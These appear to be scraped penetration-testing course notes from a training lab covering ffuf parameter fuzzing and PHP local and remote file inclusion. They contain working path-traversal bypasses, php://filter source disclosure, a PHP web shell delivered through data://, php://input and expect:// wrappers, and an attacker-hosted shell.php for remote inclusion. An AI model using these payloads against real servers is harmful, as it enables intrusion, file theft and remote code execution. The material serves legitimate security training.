<a href=javascript:history.back(); class=lightbox-back id=R-image-ff7a47385dccd87e25a11aab3b7152b8><img alt=ba5807d848e303d5abfe134c50b9a6f6.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/ba5807d848e303d5abfe134c50b9a6f6.png></a></p><p>¬†</p><p>¬†</p><h1 id=parameter-fuzzing---post>Parameter Fuzzing - POST</h1><hr><p>The main difference between <code>POST</code> requests and <code>GET</code> requests is that <code>POST</code> requests are not passed with the URL and cannot simply be appended after a <code>?</code> symbol. <code>POST</code> requests are passed in the <code>data</code> field within the HTTP request. Check out the <a href=https://academy.hackthebox.com/module/details/35 rel=external>Web Requests</a> module to learn more about HTTP requests.</p><p>To fuzz the <code>data</code> field with <code>ffuf</code>, we can use the <code>-d</code> flag, as we saw previously in the output of <code>ffuf -h</code>. We also have to add <code>-X POST</code> to send <code>POST</code> requests.</p><p>Tip: In PHP, &ldquo;POST&rdquo; data &ldquo;content-type&rdquo; can only accept &ldquo;application/x-www-form-urlencoded&rdquo;. So, we can set that in &ldquo;ffuf&rdquo; with &ldquo;-H &lsquo;Content-Type: application/x-www-form-urlencoded&rsquo;&rdquo;.</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : POST
</span></span><span style=display:flex><span> :: URL              : http://admin.academy.local:PORT/admin/admin.php
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
</span></span><span style=display:flex><span> :: Header           : Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span> :: Data             : FUZZ=key
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span> :: Filter           : Response size: xxx
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>id                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
</span></span><span style=display:flex><span>&lt;...SNIP...&gt;
</span></span></code></pre></div><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ curl http://admin.academy.local:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;div class=&#39;center&#39;&gt;&lt;p&gt;Invalid id!&lt;/p&gt;&lt;/div&gt;
</span></span><span style=display:flex><span>&lt;...SNIP...&gt;
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=value-fuzzing>Value Fuzzing</h1><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done
</span></span></code></pre></div><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.0.2
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : POST
</span></span><span style=display:flex><span> :: URL              : http://admin.academy.local:30794/admin/admin.php
</span></span><span style=display:flex><span> :: Header           : Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span> :: Data             : id=FUZZ
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span> :: Filter           : Response size: xxx
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;...SNIP...&gt;                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=local-file-inclusion-lfi>Local File Inclusion (LFI)</h1><p>PHP versions before 5.3/5.4</p><p>servers are <code>/etc/passwd</code> on Linux and <code>C:\Windows\boot.ini</code> on Windows. So, let&rsquo;s change the parameter from <code>es</code> to <code>/etc/passwd</code>:</p><p>¬†</p><p><a href=#R-image-f4ac1f1d298dfe2fd4d49d700b1d8b39 class=lightbox-link><img alt=3857e0a841cbbb68e765d6251980a605.png class="lazy lightbox figure-image" loading=lazy src=../../resources/3857e0a841cbbb68e765d6251980a605.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f4ac1f1d298dfe2fd4d49d700b1d8b39><img alt=3857e0a841cbbb68e765d6251980a605.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/3857e0a841cbbb68e765d6251980a605.png></a></p><p>¬†</p><p>¬†</p><h2 id=filename-prefix>Filename Prefix</h2><p>In our previous example, we used the <code>language</code> parameter after the directory, so we could traverse the path to read the <code>passwd</code> file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:</p><p>Code: php</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;./languages/&#34;</span> <span style=color:#f92672>.</span> $_GET[<span style=color:#e6db74>&#39;language&#39;</span>]);</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;lang_&#34;</span> <span style=color:#f92672>.</span> $_GET[<span style=color:#e6db74>&#39;language&#39;</span>]);</span></span></code></pre></div><p>In this case, if we try to traverse the directory with <code>../../../etc/passwd</code>, the final string would be <code>lang_../../../etc/passwd</code>, which is invalid:</p><p>¬†</p><p>http://&lt;SERVER_IP>:&lt;PORT>/index.php?language=/../../../etc/passwd</p><p><a href=#R-image-654d2d4a1e441896973a0c04c0e81859 class=lightbox-link><img alt=8e9a91de3d4f5b85fa54a7032cb308d8.png class="lazy lightbox figure-image" loading=lazy src=../../resources/8e9a91de3d4f5b85fa54a7032cb308d8.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-654d2d4a1e441896973a0c04c0e81859><img alt=8e9a91de3d4f5b85fa54a7032cb308d8.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/8e9a91de3d4f5b85fa54a7032cb308d8.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=basic-bypasses>Basic Bypasses</h1><p>¬†</p><p>¬†</p><hr><h2 id=non-recursive-path-traversal-filters>Non-Recursive Path Traversal Filters</h2><p>One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (<code>../</code>) to avoid path traversals. For example:</p><p>Code: php</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$language <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;../&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $_GET[<span style=color:#e6db74>&#39;language&#39;</span>]);</span></span></code></pre></div><p>¬†</p><p>http://&lt;SERVER_IP>:&lt;PORT>/index.php?language=&mldr;.//&mldr;.//&mldr;.//&mldr;.//etc/passwd</p><p>¬†</p><p>¬†</p><p>¬†</p><p>As we can see, the inclusion was successful this time, and we&rsquo;re able to read <code>/etc/passwd</code> successfully. The <code>....//</code> substring is not the only bypass we can use, as we may use <code>..././</code> or <code>....\/</code> and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. <code>....\/</code>), or adding extra forward slashes (e.g. <code>....////</code>)</p><p>¬†</p><p>¬†</p><h2 id=encoding>Encoding</h2><p><a href=#R-image-ebb8a4941c287790c08e24b6569909d0 class=lightbox-link><img alt=9305bc9d52157d60110b922b42a73d10.png class="lazy lightbox figure-image" loading=lazy src=../../resources/9305bc9d52157d60110b922b42a73d10.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ebb8a4941c287790c08e24b6569909d0><img alt=9305bc9d52157d60110b922b42a73d10.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/9305bc9d52157d60110b922b42a73d10.png></a></p><p>¬†</p><p>¬†</p><h2 id=approved-paths>Approved Paths</h2><p>Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the <code>./languages</code> directory, as follows:</p><p>Code: php</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^\.\/languages\/.+$/&#39;</span>, $_GET[<span style=color:#e6db74>&#39;language&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>include</span>($_GET[<span style=color:#e6db74>&#39;language&#39;</span>]);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Illegal path specified!&#39;</span>;
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>¬†</p><p>&lt;SERVER_IP>:&lt;PORT>/index.php?language=./languages/../../../../etc/passwd</p><p><a href=#R-image-161af89678b852e5beee7174ce59e862 class=lightbox-link><img alt=627a6c0a5e5dc3bc3ef1137627123d12.png class="lazy lightbox figure-image" loading=lazy src=../../resources/627a6c0a5e5dc3bc3ef1137627123d12.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-161af89678b852e5beee7174ce59e862><img alt=627a6c0a5e5dc3bc3ef1137627123d12.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/627a6c0a5e5dc3bc3ef1137627123d12.png></a></p><p>¬†</p><p>¬†</p><p>Check for vulnerable versions</p><p><a href=#R-image-6fcc1403bd778a877ba91de7be98318e class=lightbox-link><img alt=4ac5dd04e8c3738af94d61c30e695e5a.png class="lazy lightbox figure-image" loading=lazy src=../../resources/4ac5dd04e8c3738af94d61c30e695e5a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6fcc1403bd778a877ba91de7be98318e><img alt=4ac5dd04e8c3738af94d61c30e695e5a.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/4ac5dd04e8c3738af94d61c30e695e5a.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=appended-extension>Appended Extension</h2><p>As discussed in the previous section, some web applications append an extension to our input string (e.g. <code>.php</code>), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).</p><p>There are a couple of other techniques we may use, but they are <code>obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4</code>. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.</p><h4 id=path-truncation>Path Truncation</h4><p>In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be <code>truncated</code>, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (<code>/etc/passwd/.</code>) then the <code>/.</code> would also be truncated, and PHP would call (<code>/etc/passwd</code>). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. <code>////etc/passwd</code> is the same as <code>/etc/passwd</code>). Similarly, a current directory shortcut (<code>.</code>) in the middle of the path would also be disregarded (e.g. <code>/etc/./passwd</code>).</p><p>If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (<code>.php</code>) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to <code>start the path with a non-existing directory</code> for this technique to work.</p><p>An example of such payload would be the following:</p><p>Code: url</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-url data-lang=url>?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]</code></pre></div><p>Of course, we don&rsquo;t have to manually type <code>./</code> 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:</p><p>Basic Bypasses</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo -n &#34;non_existing_directory/../../../etc/passwd/&#34; &amp;&amp; for i in {1..2048}; do echo -n &#34;./&#34;; done
</span></span><span style=display:flex><span>non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././
</span></span></code></pre></div><p>We may also increase the count of <code>../</code>, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only <code>.php</code> gets truncated and not our requested file at the end of the string (<code>/etc/passwd</code>). This is why it would be easier to use the first method.</p><h4 id=null-bytes>Null Bytes</h4><p>PHP versions before 5.5 were vulnerable to <code>null byte injection</code>, which means that adding a null byte (<code>%00</code>) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.</p><p>To exploit this vulnerability, we can end our payload with a null byte (e.g. <code>/etc/passwd%00</code>), such that the final path passed to <code>include()</code> would be (<code>/etc/passwd%00.php</code>). This way, even though <code>.php</code> is appended to our string, anything after the null byte would be truncated, and so the path used would actually be <code>/etc/passwd</code>, leading us to bypass the appended extension.</p><p>¬†</p><h1 id=php-filters>PHP Filters</h1><p>¬†</p><h2 id=input-filters>Input Filters</h2><p><a href=https://www.php.net/manual/en/filters.php rel=external>PHP Filters</a> are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the <code>php://</code> scheme in our string, and we can access the PHP filter wrapper with <code>php://filter/</code>.</p><p>The <code>filter</code> wrapper has several parameters, but the main ones we require for our attack are <code>resource</code> and <code>read</code>. The <code>resource</code> parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the <code>read</code> parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.</p><p>There are four different types of filters available for use, which are <a href=https://www.php.net/manual/en/filters.string.php rel=external>String Filters</a>, <a href=https://www.php.net/manual/en/filters.convert.php rel=external>Conversion Filters</a>, <a href=https://www.php.net/manual/en/filters.compression.php rel=external>Compression Filters</a>, and <a href=https://www.php.net/manual/en/filters.encryption.php rel=external>Encryption Filters</a>. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the <code>convert.base64-encode</code> filter, under <code>Conversion Filters</code>.</p><p>¬†</p><p>¬†</p><h2 id=fuzzing-for-php-files>Fuzzing for PHP Files</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
</span></span><span style=display:flex><span>config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=source-code-disclosure>Source Code Disclosure</h2><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-url data-lang=url>php://filter/read=convert.base64-encode/resource=config</code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-86cb919bb91af424d275000ce2f8d6f0 class=lightbox-link><img alt=14f1bf79efae58b25b749cffc588511c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/14f1bf79efae58b25b749cffc588511c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-86cb919bb91af424d275000ce2f8d6f0><img alt=14f1bf79efae58b25b749cffc588511c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/14f1bf79efae58b25b749cffc588511c.png></a></p><p>¬†</p><p>¬†</p><p>We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.</p><p>¬†</p><p>¬†</p><h2 id=data>Data</h2><p>The <a href=https://www.php.net/manual/en/wrappers.data.php rel=external>data</a> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (<code>allow_url_include</code>) setting is enabled in the PHP configurations. So, let&rsquo;s first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.</p><h4 id=checking-php-configurations>Checking PHP Configurations</h4><p>To do so, we can include the PHP configuration file found at (<code>/etc/php/X.Y/apache2/php.ini</code>) for Apache or at (<code>/etc/php/X.Y/fpm/php.ini</code>) for Nginx, where <code>X.Y</code> is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn&rsquo;t locate the configuration file. We will also use the <code>base64</code> filter we used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, we&rsquo;ll use</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ curl &#34;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&#34;
</span></span></code></pre></div><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep allow_url_include
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>allow_url_include = On
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h4 id=remote-code-execution>Remote Code Execution</h4><p>With <code>allow_url_include</code> enabled, we can proceed with our <code>data</code> wrapper attack. As mentioned earlier, the <code>data</code> wrapper can be used to include external data, including PHP code. We can also pass it <code>base64</code> encoded strings with <code>text/plain;base64</code>, and it has the ability to decode them and execute the PHP code.</p><p>So, our first step would be to base64 encode a basic PHP web shell, as follows:</p><p>PHP Wrappers</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; | base64
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
</span></span></code></pre></div><p>Now, we can URL encode the base64 string, and then pass it to the data wrapper with <code>data://text/plain;base64,</code>. Finally, we can use pass comm</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ curl -s &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#39; | grep uid
</span></span></code></pre></div><p>ands to the web shell with <code>&amp;cmd=&lt;COMMAND></code>:</p><p>¬†</p><p>¬†</p><h2 id=input>Input</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ube111@local[/local]$ curl -s -X POST --data &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &#34;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&#34; | grep uid
</span></span><span style=display:flex><span>            uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=expect>Expect</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep expect
</span></span><span style=display:flex><span>extension=expect
</span></span></code></pre></div><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ curl -s &#34;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&#34;
</span></span><span style=display:flex><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h1 id=remote-file-inclusion-rfi>Remote File Inclusion (RFI)</h1><h2 id=verify-rfi>Verify RFI</h2><p>In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the <code>allow_url_include</code> setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:</p><p>Remote File Inclusion (RFI)</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep allow_url_include
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>allow_url_include = On
</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-f65b490ae8ade802505a59955065f4f4 class=lightbox-link><img alt=d712f6cbf965c84889f8f3b71e09566b.png class="lazy lightbox figure-image" loading=lazy src=../../resources/d712f6cbf965c84889f8f3b71e09566b.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f65b490ae8ade802505a59955065f4f4><img alt=d712f6cbf965c84889f8f3b71e09566b.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/d712f6cbf965c84889f8f3b71e09566b.png></a></p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.php
</span></span></code></pre></div><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python3 -m http.server &lt;LISTENING_PORT&gt;
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...
</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-1651009be2029dca724cac30ac374f9c class=lightbox-link><img alt=fff585695d997225d2a7e766f7db99fe.png class="lazy lightbox figure-image" loading=lazy src=../../resources/fff585695d997225d2a7e766f7db99fe.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1651009be2029dca724cac30ac374f9c><img alt=fff585695d997225d2a7e766f7db99fe.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/fff585695d997225d2a7e766f7db99fe.png></a></p><p>¬†</p><h2 id=ftp>FTP</h2><p>As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python&rsquo;s <code>pyftpdlib</code>, as follows:</p><p>Remote File Inclusion (RFI)</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python -m pyftpdlib -p 21
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[SNIP] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=23686 &lt;&lt;&lt;
</span></span><span style=display:flex><span>[SNIP] concurrency model: async
</span></span><span style=display:flex><span>[SNIP] masquerade (NAT) address: None
</span></span><span style=display:flex><span>[SNIP] passive ports: None
